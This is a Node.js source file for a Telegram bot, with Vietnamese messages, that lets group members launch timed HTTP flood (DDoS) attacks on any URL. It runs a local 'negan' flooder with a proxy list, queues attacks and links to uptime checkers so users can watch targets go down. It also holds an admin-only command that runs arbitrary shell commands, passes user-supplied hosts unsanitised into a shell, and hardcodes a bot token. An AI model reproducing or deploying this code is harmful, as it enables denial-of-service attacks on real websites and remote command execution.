const TelegramBot = require('node-telegram-bot-api'), { exec } = require('child_process');
const token = '7935173392:AAFYFVwBtjee7R33I64gcB3CE_-veYkU4lU', adminId = 1243471275, allowedGroupIds = new Set([-1002423723717, 987654321, 112233445, 556677889, 998877665]), maxTime = 120, maxConcurrent = 3, maxSlot = 1;
const bot = new TelegramBot(token, { polling: true }), processes = { users: new Map(), attacks: new Map(), queue: [] };

bot.sendMessage(adminId, '[Version PRO] 🤖 Bot is ready to receive commands.');

const sendMsg = (chatId, text, buttons) => bot.sendMessage(chatId, text, { parse_mode: 'HTML', ...(buttons && { reply_markup: { inline_keyboard: buttons }) });

const execute = (chatId, host, time, user, uid) => {
    const pid = Date.now() % 1e6, start = new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
    sendMsg(chatId, `🚀 Successfully 🚀\nPID: ${pid}\nWEBSITE: ${host}\nTime: ${time}s\nCaller: @${user}\nMaxslot: ${maxSlot}\nConcurrentAttacks: ${processes.attacks.size + 1}\nStart: ${start}`, [
        [{ text: 'Check Host', url: `https://check-host.net/check-http?host=${host}` }],
        [{ text: 'Host Tracker', url: `https://www.host-tracker.com/en/ic/check-http?url=${host}` }]
    ]);
    
    const child = exec(`node ./negan -m GET -u "${host}" -p live.txt --full true -s ${time}`, { shell: '/bin/bash' });
    processes.attacks.set(pid, { uid, start: Date.now() });
    processes.users.set(uid, { pid, start: Date.now(), time });

    child.on('error', e => (sendMsg(chatId, `❌ Lỗi: ${e.message}`), cleanup(pid, uid))
          .on('close', () => {
              sendMsg(chatId, `✅ Completed\nPID: ${pid}\nWEBSITE: ${host}\nTime: ${time}s\nCaller: @${user}\nEnd: ${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}`);
              cleanup(pid, uid);
              processQueue();
          });
};

const cleanup = (pid, uid) => (processes.attacks.delete(pid), processes.users.delete(uid));
const processQueue = () => processes.queue.length > 0 && processes.attacks.size < maxConcurrent && 
    (({ chatId, host, time, user, uid }) => execute(chatId, host, time, user, uid))(processes.queue.shift());

bot.on('message', msg => {
    const { chat: { id: cid }, text, from: { id: uid, username: user = 'Unknown' } = {} } = msg;
    const [isAdmin, isGroup] = [uid === adminId, allowedGroupIds.has(cid)];
    
    if (!isAdmin && !isGroup) return sendMsg(cid, '🚫 Không có quyền thực hiện');
    if (!text) return;

    if (/^https?:\/\//.test(text)) {
        const [host, time] = text.split(' '), t = parseInt(time);
        if (!host || !t) return sendMsg(cid, '🚫 Sai định dạng: <URL> <thời gian>');
        if (t > maxTime) return sendMsg(cid, `🚫 Tối đa ${maxTime} giây`);
        
        const userCount = [...processes.attacks.values()].filter(x => x.uid === uid).length;
        if (userCount >= maxSlot) return sendMsg(cid, `🚫 Đạt giới hạn ${maxSlot} lượt/người`);
        
        return processes.attacks.size >= maxConcurrent ? 
            (processes.queue.push({ chatId: cid, host, time: t, user, uid }), sendMsg(cid, '⏳ Đã thêm vào hàng đợi')) : 
            execute(cid, host, t, user, uid);
    }

    if (text.startsWith('exe ') && isAdmin) {
        const cmd = text.slice(4).trim();
        return cmd ? exec(cmd, (e, o, r) => sendMsg(cid, `<pre>${cmd}\n${e || r || o}</pre>`) : sendMsg(cid, '🚫 Lệnh trống');
    }

    sendMsg(cid, '🚫 Lệnh không hợp lệ');
});
